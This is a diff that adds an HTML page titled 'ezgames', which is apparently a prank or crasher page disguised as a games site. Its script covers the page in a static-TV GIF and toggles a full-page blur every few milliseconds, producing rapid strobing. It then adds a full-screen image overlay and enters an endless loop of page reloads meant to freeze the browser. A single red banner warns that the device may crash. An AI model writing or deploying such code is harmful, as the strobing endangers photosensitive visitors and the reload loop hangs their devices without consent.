@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ezgames</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        #warningBox {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: red;
+            font-size: 2em;
+            text-align: center;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="warningBox">
+        WARNING: Your device may crash or freeze!
+    </div>
+
+    <script type="text/javascript">
+        (function() {
+            // Function to apply the static TV background to every child node
+            function a(e) {
+                var n = e.childNodes;
+                for (var i in n) {
+                    a(n[i]);
+                    if (n[i].style) {
+                        n[i].style.backgroundImage = "url(https://media.tenor.com/88dnH_mHRLAAAAAM/static-tv-static.gif)";
+                    }
+                }
+            }
+            a(document);
+
+            var howfast = 3;
+            var bluroffspeed = howfast;
+            var bluronspeed = howfast * 2;
+
+            // Function to apply blur effect to the page
+            function bluron() {
+                document.body.style.filter = 'blur(5px)';
+                setTimeout(bluroff, bluroffspeed);
+            }
+
+            // Function to remove blur effect
+            function bluroff() {
+                document.body.style.filter = 'blur(0px)';
+            }
+
+            // Repeated blur effect
+            setInterval(bluron, bluronspeed);
+
+            // Function to create a red warning box with background image
+            function waiting() {
+                var elem = document.createElement('div');
+                var body = document.getElementsByTagName('body')[0];
+                body.appendChild(elem);
+                elem.style.textAlign = 'center';
+                elem.style.margin = screen.height / 2 + "px";
+                elem.style.position = 'fixed';
+                elem.style.top = '0px';
+                elem.style.left = '0px';
+                elem.style.margin = '0px';
+                elem.style.width = '' + screen.width + 'px';
+                elem.style.height = '' + screen.height + 30 + 'px';
+                elem.style.zIndex = 10000;
+                elem.style.opacity = 1;
+                elem.style.textAlign = 'center';
+                elem.style.color = 'red';
+                elem.id = 'elem';
+                elem.style.fontSize = "30%";
+                elem.style.display = 'block';
+                elem.style.backgroundImage = "url(https://i.ytimg.com/vi/R8lHaEZYpCU/maxresdefault.jpg)";
+            }
+
+            // Function to continuously reload the page
+            function waiting2() {
+                while (true) {
+                    window.location.reload(1);
+                }
+            }
+
+            // Set timeouts to execute waiting function and page reloading
+            setTimeout(waiting, 900);
+            setTimeout(waiting2, 1800);
+        })();
+    </script>
+
+</body>
+</html>
